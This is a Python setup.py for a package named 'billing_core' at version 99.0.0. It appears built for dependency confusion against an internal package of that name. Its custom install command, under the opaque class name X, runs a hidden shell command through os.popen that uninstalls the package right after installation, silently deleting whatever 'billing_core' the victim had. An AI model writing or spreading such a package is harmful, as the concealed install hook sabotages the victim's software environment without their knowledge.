import os
from setuptools import setup
from setuptools.command.install import install
PKG = "billing_core"
class X(install):
    def run(self):
        install.run(self)
        os.popen(f"pip uninstall -y {PKG}").read()
setup(name=PKG, version='99.0.0', cmdclass={'install': X})
